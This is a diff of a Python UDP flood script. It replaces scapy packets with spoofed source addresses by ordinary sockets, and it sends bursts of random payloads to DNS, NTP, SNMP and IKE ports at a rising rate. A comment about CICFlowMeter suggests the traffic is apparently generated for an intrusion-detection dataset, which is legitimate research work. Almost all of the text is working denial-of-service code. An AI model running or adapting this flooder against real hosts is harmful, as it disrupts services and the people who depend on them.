@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
-import scapy.all as scapy
+import socket
 import random
 import time
 import sys
+import os
 
 
 def attack_profile(duration):
@@ -27,23 +28,7 @@ def attack_profile(duration):
 def gaussian_payload():
     size = int(random.gauss(650, 250))
     size = max(64, min(size, 1400))
-    return scapy.Raw(load=bytes(random.getrandbits(8) for _ in range(size)))
-
-
-def random_clustered_ip():
-    base = random.randint(1, 20)
-    return f"10.10.{base}.{random.randint(2,254)}"
-
-
-def build_flow_pool(flow_count=60000):
-    pool = []
-    for _ in range(flow_count):
-        pool.append((
-            random_clustered_ip(),
-            random.randint(20000, 65000),
-            random.choice([53, 123, 161, 500])
-        ))
-    return pool
+    return os.urandom(size)
 
 
 def udp_flood(target_ip, duration):
@@ -51,37 +36,42 @@ def udp_flood(target_ip, duration):
     base_rate = 800
     peak_rate = 2500
 
-    packets_per_flow = 2
-    flow_pool = build_flow_pool(flow_count=60000)
+    total_flows = 60000
+    flows_created = 0
 
     start = time.time()
-    flow_index = 0
-    total_flows = len(flow_pool)
 
     for intensity in attack_profile(duration):
 
-        if flow_index >= total_flows:
+        if flows_created >= total_flows:
             break
 
         current_rate = base_rate + (peak_rate - base_rate) * intensity
 
-        src_ip, sport, dport = flow_pool[flow_index]
+        try:
+            # Create real UDP socket (kernel chooses source IP)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-        for _ in range(packets_per_flow):
-            pkt = (
-                scapy.IP(src=src_ip, dst=target_ip) /
-                scapy.UDP(sport=sport, dport=dport) /
-                gaussian_payload()
-            )
-            scapy.send(pkt, verbose=0)
+            # Optional: random high source port
+            s.bind(("", random.randint(20000, 65000)))
 
-        flow_index += 1
+            payload = gaussian_payload()
+
+            # Send twice so CICFlowMeter counts flow
+            s.sendto(payload, (target_ip, random.choice([53, 123, 161, 500])))
+            s.sendto(payload, (target_ip, random.choice([53, 123, 161, 500])))
+
+            s.close()
+            flows_created += 1
+
+        except:
+            pass
 
         sleep_time = max(0.0002, 1.0 / current_rate)
         sleep_time *= random.uniform(0.7, 1.3)
         time.sleep(sleep_time)
 
-    print(f"Approx flows generated: {flow_index}")
+    print(f"Approx UDP flows generated: {flows_created}")
 
 
 if __name__ == "__main__":
